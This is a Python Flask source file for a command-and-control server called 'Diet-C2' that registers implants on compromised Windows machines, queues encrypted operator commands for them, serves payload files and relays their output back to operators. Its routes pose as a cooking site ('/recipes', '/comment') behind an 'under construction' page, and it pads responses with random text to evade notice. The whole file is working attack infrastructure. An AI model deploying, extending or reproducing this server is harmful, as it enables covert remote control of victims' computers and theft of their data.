from modules import encryption
from modules import server_codes
from modules import storage
from datetime import datetime
import os
from flask import Flask, current_app, request, make_response, jsonify, send_from_directory, send_file
from werkzeug.utils import secure_filename
from typing import Dict
import random
import requests

# Constants, to be changed via config file or command line params later
SERVER_IP = "0.0.0.0"
SERVER_PORT = 80
ENC_KEY = "thisisakey:)1234"
RANDOM_SLEEP = False
SLEEP_DURATION = 10 # If random sleep is set to true, will have a % and use rand() % (SLEEP_DURATION+1)

# Init the flask app
app = Flask(__name__)
UPLOAD_FOLDER = 'uploads'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# Globals for storage
operator_db = storage.OperatorDatabase()
implant_db = storage.ImplantDatabase()
commandlog_db = storage.CommandLogDatabase()

# FOR TESTING only
implant_db.add_implant(storage.Implant(name="test", major_v="10", build_num="1000", sleep_time=10))

AES_INSTANCE = encryption.AESCipher(ENC_KEY)

# Helper to process a command for implants
def store_and_queue_command(cmd_str: str, implant_command: storage.ImplantCommand, operator_name: str):
    
    # Encrypt the command
    enc_cmd_str = AES_INSTANCE.encrypt(raw_str=cmd_str).decode('utf-8')

    # Add the encrypted command string to the implants queue
    implant_db.dict[implant_command.implant_name].queue_command(enc_cmd_str)

    # Put the command and operator into the commandlog_db
    cmd_log = storage.CommandLog(operator_db.dict[operator_name], implant_command)
    commandlog_db.add_command_log(cmd_log)

# Helper function to update all operators when something 
# happens, like a new implant connecting
def update_operators(update_type: server_codes.ServerUpdates,data):
    for op_name in operator_db.dict:
        op = operator_db.dict[op_name]
        url = "/update"
        update_json = build_operator_update(update_type, data)
        requests.post("http://"+op.IP+":"+op.port+url, json=update_json)


# Helper function to build operator update depending on
# update type
def build_operator_update(update_type: server_codes.ServerUpdates, data) -> Dict:
    match update_type:
        case server_codes.ServerUpdates.NEW_IMPLANT:
            # data must be the Implant object
            return {"update_type": update_type.value, "update_data": data.__dict__}
        case server_codes.ServerUpdates.NEW_COMMAND_RESPONSE:
            # data must be the cmd_id
            return {}
        case _:
            return {}

### Start the routing ###

# Default dummy page
@app.route("/", methods=['GET'])
def under_construction():
    return "<h3>Site is still under construction, come back soon!</h3>"

# The login route for implants
@app.route("/login", methods=['POST'])
def implant_register():
    try:
        # Read in Base64 post data
        aes_data = request.get_data()

        # Decrypt it
        data = AES_INSTANCE.decrypt(aes_data)
        
        # Extract the major windows version and the build number
        major_v = data.split(":::")[0]
        build_num = data.split(":::")[1]
        sleep_time = data.split(":::")[2]

        # Generate a name
        new_implant_name = encryption.id_generator(N=4)
        # Print for debug
        print(new_implant_name)

        # Add the new implant to the implant_db
        implant_db.add_implant(storage.Implant(name=new_implant_name,
                                               major_v=major_v,
                                               build_num=build_num,
                                               sleep_time=sleep_time
                                              ))

        # Update the operators
        update_operators(server_codes.ServerUpdates.NEW_IMPLANT, implant_db.dict[new_implant_name])
        print(f"A new implant has connected: {new_implant_name}")

        # Set the first contact time
        implant_db.dict[new_implant_name].last_checkin = datetime.now()

        # Respond with the new name as a Cookie header and random text
        response = make_response(encryption.id_generator(random.randint(200,350)))
        response.headers["Cookie"] = new_implant_name
        return response
    except:
        print("An implant tried to log in but the /login endpoint error'ed")
        return server_codes.ServerErrors.ERR_IMPLANT_LOGIN_EXCEPTION.value

# The command recieve route for implants
@app.route("/recipes")
def implant_command():
    # Read the Cookie header for the implant name
    implant_name = request.headers['Cookie']
    
    if implant_name not in implant_db.dict:
        return "Site is under construction"
    
    if len(implant_db.dict[implant_name].command_queue) > 0:
        new_cmd = implant_db.dict[implant_name].pop_command()

        resp = make_response(new_cmd)
        return resp

    return "0"

# The file download route for implants
@app.route("/recipes/download/<FILE_ID>")
def implant_download(FILE_ID):
    try:
        uploads = os.path.join(current_app.root_path, app.config['UPLOAD_FOLDER'])
        file_path = os.path.join(uploads, FILE_ID)
        return send_file(file_path, as_attachment=True)
    except:
        return "There was an error with file download..."
 
# The response route for output from implants
@app.route("/comment", methods=['POST'])
def implant_response():

    # Read in Base64 post data
    aes_data = request.get_data()

    # Decrypt it
    data = ""
    try:
        data = AES_INSTANCE.decrypt(aes_data)
    except:
        print("There was an error decrypting the message from an implant trying to log in. Please make sure the payload was generated with the same key as the listener")

    implant_name = request.headers["Cookie"]
    # If not signed in, do nothing, return
    if implant_name not in implant_db.dict:
        return "Site is under construction"
    
    data = data.split(":::")
    ID = data[0]

    # Edit the command_db
    commandlog_db.dict[ID].command.output = data[1]
    commandlog_db.dict[ID].response_timestamp = datetime.now()

    # Build a json-able dict to send back to the operator
    r = { "command": commandlog_db.dict[ID].command.__dict__,
          "sent_timestamp": str(commandlog_db.dict[ID].sent_timestamp),
          "response_timestamp": str(commandlog_db.dict[ID].response_timestamp)
        }

    # Send the response back to the operator
    op = commandlog_db.dict[ID].operator
    data = {"update_type": "NEW_COMMAND_RESPONSE", "update_data": r}
    resp = requests.post("http://"+op.IP+":"+op.port+"/update", json=data)

    
    ret = make_response(encryption.id_generator(random.randint(200,350)))
    return ret

# Operator connects to this endpoint to login
@app.route("/admin/login", methods=['POST'])
def operator_login():
    # Error response, assigned in the expect block
    try:
        # Extract values from login
        r_json = request.get_json()
        # Make sure the operator name doesn't already exist
        if not operator_db.is_unique(r_json["username"]):
            return server_codes.ServerErrors.ERR_OPERATOR_NAME_EXISTS.value
        
        # Add the operator to db
        operator_db.add_operator(r_json["username"],
                                 storage.Operator(
                                     name=r_json["username"],
                                     IP=r_json["lip"],
                                     port=r_json["lport"]
                                     )
                                 )
        # Now create the response, a dict of implant objects
        # but only with the included data
        resp_db = {}
        for implant in implant_db.dict:
            resp_db[implant] = implant_db.dict[implant].__dict__
        resp_json = {"implant_db": resp_db}

        # Send back the data inside the implant_db on the server
        return jsonify(resp_json)
    # TODO: Make some proper error catching stuff for the server
    except Exception as err:
        print(repr(err))
        return server_codes.ServerErrors.ERR_LOGIN_EXCEPTION.value

# Operator connects to this endpoint to get updated data
@app.route("/admin/update/<TO_UPDATE>", methods=['GET'])
def update_db(TO_UPDATE):
    # Sends back a JSON of the implant db
    if TO_UPDATE == "implants":
        resp_db = {}
        for implant in implant_db.dict:
            resp_db[implant] = implant_db.dict[implant].__dict__ 
        resp_json = {"implant_db": resp_db}
        return jsonify(resp_json)

    return ""

# Operator connects to this endpoint to send commands
# If there is a file, the file will be processed and saved first
# before assigning the command_str
@app.route("/admin/management", methods=['POST'])
def str_command():

    # Parse out the headers for metadata of command to store
    headers = dict(request.headers)
    op_name = headers["X-Operator-Name"]
    imp_name = headers["X-Implant-Name"]
    cmd_type = headers["X-Command-Type"]
    cmd_id = headers["X-Command-Id"]


    # Get the command string and decode from bytes
    cmd_str = request.form['cmd_str']
    print(cmd_str)

    # If there is a command involving a file
    # if not, just save the command string and log it in the commandlog_db
    if 'cmd_file' in request.files:
        try: 
            # Pull out the file from request
            file = request.files['cmd_file']
            file_id = file.filename

            # Make sure the file path is secure i guess :)
            file_id = secure_filename(file_id)

            # Encrypt the file!
            file.seek(0)
            file_bytes = file.read()
            # Need to decode it from bytes first to get it to work in the encryptin 
            enc_file = AES_INSTANCE.encrypt(file_bytes)
            # Save the file in the path specified in the config at top of file
            with open(os.path.join(app.config['UPLOAD_FOLDER'], file_id), "wb") as f:
                f.write(enc_file)


        # If server fails to save for any reason, return ERR_UPLOAD_EXCEPTION
        except Exception as err:
            print(repr(err))

    # Make the implant command object
    implant_command = storage.ImplantCommand(name=imp_name,
                                             type=cmd_type,
                                             id=cmd_id
                                            )

    # Store the plaintext command in the commandlog_db, then encrypt it and
    # queue it for the implant
    store_and_queue_command(cmd_str=cmd_str,
                            implant_command=implant_command,
                            operator_name=op_name
                           )
    return "0"

if __name__ == "__main__":
    print(f"Starting Diet-C2 server on {SERVER_IP} on port {SERVER_PORT}")
    # Put the flask server on a seperate thread, continue on to use the CLI interface
    app.run(host=SERVER_IP, port=SERVER_PORT, debug=False, use_reloader=False)
